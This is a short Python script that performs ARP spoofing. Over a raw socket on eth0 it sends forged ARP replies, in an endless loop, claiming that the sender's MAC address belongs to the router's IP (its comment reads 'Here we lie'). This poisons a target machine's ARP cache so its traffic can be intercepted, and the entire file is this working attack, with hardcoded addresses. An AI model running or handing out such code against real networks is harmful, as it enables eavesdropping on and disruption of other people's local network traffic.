#!/usr/bin/env python3

import socket
from struct import pack
from uuid import getnode as get_mac

def main():
    # TODO: fetch required information from args to pack
    #dest_ip = [10, 7, 31, 99]
    #local_mac = [int(("%x" % get_mac())[i:i+2], 16) for i in range(0, 12, 2)]
    #binascii.hexlify(bytes(hex(get_mac()).encode('UTF-8')))
    
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.bind(("eth0", 0))
    
    arp_packet = [
        b'\x00\x50\x56\xc0\x00\x03', # Target MAC
        b'\x00\x0c\x29\x80\x68\xcf', # Our MAC
        pack('!H', 0x0806), # Ethtype = ARP
        pack('!H', 0x0001), # HRD (constant?)
        pack('!H', 0x0800), # Protocol = Ipv4
        pack('!B', 0x06),   # Hardware Size (constant?)
        pack('!B', 0x04),   # Protocol Size (constant?)
        pack('!H', 0x0002), # OP    Should try to use OP = 0x0001 to see if it also works

        # We can use an int size of 4 and 8, but not 6, so the nB might be used.
        # In order to use this notation though, we must have either a tuple or list.
        # binascii or other imports might allow us to use a single function though.
        #pack('!6B', *local_mac),
        #pack('!4B', *local_ip),
        
        # Here we lie and say that our mac address is the resolution of the router IP
        b'\x00\x0c\x29\x80\x68\xcf', # Our MAC
        b'\xc0\xa8\x0a\x02'          # IP addr of the router
        
        # Note: the ip will be provided to us and we must resolve their mac address.
        # 
        b'\x00\x50\x56\xc0\x00\x03', # Target MAC
        b'\xc0\xa8\x0a\x01'          # Target IP
    ]
    #print(arp_packet)
    
    # Possible broadcast option?
    # sock.sendto(b''.join(ARP_FRAME), ('255.255.255.255', 0))
    s.send(b''.join(arp_packet))
    s.close()

if __name__ == "__main__":
    while True:
        main()

